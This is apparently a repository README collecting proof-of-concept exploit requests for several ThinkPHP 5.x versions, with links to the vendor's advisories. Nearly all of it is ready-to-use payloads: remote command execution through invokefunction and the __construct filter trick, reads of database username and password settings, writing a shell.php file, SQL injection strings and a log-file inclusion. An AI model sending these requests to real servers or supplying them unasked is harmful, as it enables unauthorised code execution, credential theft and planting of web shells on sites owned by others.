# thinkphp-RCE-POC
官方公告:

1、https://blog.thinkphp.cn/869075

2、https://blog.thinkphp.cn/910675


# POC:

# thinkphp 5.0.22
```
1、http://192.168.1.1/thinkphp/public/?s=.|think\config/get&name=database.username

2、http://192.168.1.1/thinkphp/public/?s=.|think\config/get&name=database.password

3、http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id

4、http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
```
# thinkphp 5
```
5、http://127.0.0.1/tp5/public/?s=index/\think\View/display&content=%22%3C?%3E%3C?php%20phpinfo();?%3E&data=1

```
# thinkphp 5.0.21
```
6、http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id

7、http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

```
# thinkphp 5.1.*

```
index.php?s=/index/\think\request/cache&key=1|phpinfo

8、http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&filter=phpinfo&data=1

9、http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&filter=system&data=cmd

10、http://url/to/thinkphp5.1.29/?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E

11、http://url/to/thinkphp5.1.29/?s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E

12、http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

13、http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd

14、http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

15、http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd</br>
```

# 未知版本
```

16、?s=index/\think\module/action/param1/${@phpinfo()}

17、?s=index/\think\Module/Action/Param/${@phpinfo()}

18、?s=index/\think/module/aciton/param1/${@print(THINK_VERSION)}

19、index.php?s=/home/article/view_recent/name/1' 
header = "X-Forwarded-For:1') and extractvalue(1, concat(0x5c,(select md5(233))))#"

20、index.php?s=/home/shopcart/getPricetotal/tag/1%27

21、index.php?s=/home/shopcart/getpriceNum/id/1%27

22、index.php?s=/home/user/cut/id/1%27

23、index.php?s=/home/service/index/id/1%27
24、index.php?s=/home/pay/chongzhi/orderid/1%27

25、index.php?s=/home/pay/index/orderid/1%27

26、index.php?s=/home/order/complete/id/1%27

27、index.php?s=/home/order/complete/id/1%27

28、index.php?s=/home/order/detail/id/1%27

29、index.php?s=/home/order/cancel/id/1%27

30、index.php?s=/home/pay/index/orderid/1%27)%20UNION%20ALL%20SELECT%20md5(233)--+

31、POST /index.php?s=/home/user/checkcode/ HTTP/1.1
    Content-Disposition: form-data; name="couponid"
1') union select sleep('''+str(sleep_time)+''')#

```

# thinkphp 5.0.23（完整版）debug模式
```

32、(post)public/index.php (data)_method=__construct&filter[]=system&server[REQUEST_METHOD]=touch%20/tmp/xxx
```

# thinkphp 5.0.23(完整版)

```

33、（post）public/index.php?s=captcha (data) _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls -al

```

# thinkphp 5.0.10（完整版）

```

34、(post)public/index.php?s=index/index/index (data)s=whoami&_method=__construct&method&filter[]=system

```

# thinkphp 5.1.* 和 5.2.* 和 5.0.*

```

35、(post)public/index.php (data)c=exec&f=calc.exe&_method=filter

```

# 文件包含

```
_method=__construct&method=get&filter[]=think\__include_file&server[]=phpinfo&get[]=runtime/log/201911/13.log&x=ls

```
